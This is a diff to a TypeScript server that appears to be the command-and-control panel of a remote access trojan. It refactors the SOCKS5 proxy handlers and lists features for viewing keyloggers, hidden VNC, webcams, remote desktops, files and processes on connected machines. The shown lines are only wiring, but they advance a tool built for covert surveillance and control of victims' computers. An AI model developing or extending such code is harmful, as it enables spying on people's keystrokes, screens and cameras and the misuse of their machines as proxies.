@@ -99,10 +99,12 @@ import {
   handleProcessMessage,
   handleProcessViewerMessage,
   handleProcessViewerOpen,
-  handleProxyMessage,
-  handleProxyViewerMessage,
-  handleProxyViewerOpen,
 } from "./server/ws-file-process-proxy-keylogger";
+import {
+  handleProxyTunnelData,
+  handleProxyTunnelClose,
+  handleProxyConnectResult,
+} from "./server/socks5-proxy-manager";
 import {
   cleanupVoiceViewer,
   handleVoiceUplink,
@@ -262,7 +264,7 @@ const notificationPluginHandlers = createNotificationPluginHandlers({
   savePluginState,
 });
 
-type SocketRole = ClientRole | "console_viewer" | "rd_viewer" | "webcam_viewer" | "hvnc_viewer" | "file_browser_viewer" | "process_viewer" | "keylogger_viewer" | "proxy_viewer" | "notifications_viewer";
+type SocketRole = ClientRole | "console_viewer" | "rd_viewer" | "webcam_viewer" | "hvnc_viewer" | "file_browser_viewer" | "process_viewer" | "keylogger_viewer" | "notifications_viewer";
 
 type PendingScript = {
   resolve: (result: any) => void;
@@ -413,7 +415,6 @@ async function startServer() {
     handleFileBrowserViewerOpen,
     handleProcessViewerOpen,
     handleKeyloggerViewerOpen,
-    handleProxyViewerOpen,
     handleVoiceViewerOpen,
     handleNotificationViewerOpen: notificationPluginHandlers.handleNotificationViewerOpen,
     handleConsoleViewerMessage,
@@ -423,7 +424,6 @@ async function startServer() {
     handleFileBrowserViewerMessage,
     handleProcessViewerMessage,
     handleKeyloggerViewerMessage,
-    handleProxyViewerMessage,
     handleVoiceViewerMessage,
     dispatchAutoScriptsForConnection,
     takePendingNotificationScreenshot: takePendingNotificationScreenshotForClient,
@@ -436,7 +436,9 @@ async function startServer() {
         consumeHttpDownloadPayload: (downloadPayload: any) =>
           consumeHttpDownloadPayload(downloadPayload, pendingHttpDownloads),
       }),
-    handleProxyMessage,
+    handleProxyTunnelData,
+    handleProxyTunnelClose,
+    handleProxyConnectResult,
     handleProcessMessage,
     handleKeyloggerMessage,
     notifyRdInputLatency,
